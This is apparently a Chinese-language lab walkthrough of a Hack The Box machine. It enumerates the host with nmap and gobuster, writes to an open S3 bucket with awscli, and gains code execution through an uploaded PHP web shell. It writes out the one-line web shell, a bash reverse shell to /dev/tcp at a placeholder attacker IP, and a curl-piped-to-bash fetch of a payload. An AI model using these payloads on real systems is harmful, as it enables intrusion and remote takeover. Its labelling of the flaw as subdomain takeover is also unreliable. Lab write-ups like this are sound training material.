### 一、操作流程
1. 使用`nmap`扫描主机
> nmap -sV 10.129.67.48
> 
```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-06 08:46 CST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.129.67.48
Host is up (1.0s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.36 seconds
```
> 存在80端口和22端口，对22进行爆破无效，访问80

2. 获取敏感信息
> 打开火狐的`Wappalyzer`插件，发现后台语言使用php

3. 虚拟主机爆破
> gobuster vhost -w /usr/share/wordlists/wfuzz/general/common.txt -u http://thetoppers.htb
> `http://thetoppers.htb`在访问的页面上获取，并在`/etc/hosts`配置ip映射，爆破后发现存在虚拟主机`http://s3.thetoppers.htb`

4. 连接虚拟主机`http://s3.thetoppers.htb`
> 虚拟主机启用的服务为`Amazon s3 `,提供静态网站托管的功能,通常给业务部门存储静态资源
- 连接`Amazon s3 `服务
  -  安装:`apt install awscli`
  -  设置:`aws configure`
  -  常用命令:
        > aws --endpoint=http://s3.thetoppers.htb s3 ls #查看托管的主机
        > aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb # 查看文件列表,通过这步确认托管了web服务，因此可以利用其他命令行上传后门文件
        >  aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb #上传文件

5. 反弹shell
> - echo "\<?php system($_GET["cmd"]); ?>"   >   shell.php   #生成文件，用来执行操作系统命令
> - 使用`aws`指令上传到服务器
> - 本地启动简易的web服务，如`python3 -m http.server 8000`
> - 本地监听指定端口，如`nc -nvlp 1337`
> -  本地创建shell.sh文件，并写入`bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1`
> -  利用后门文件调用从而反弹shell,即执行`http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash`

### 涉及知识点
1. `Amazon s3 `服务
2. 子域名接管漏洞 
>  利用子域名使用到期后没有清除其到域名的映射记录，从而被利用
3. 反弹shell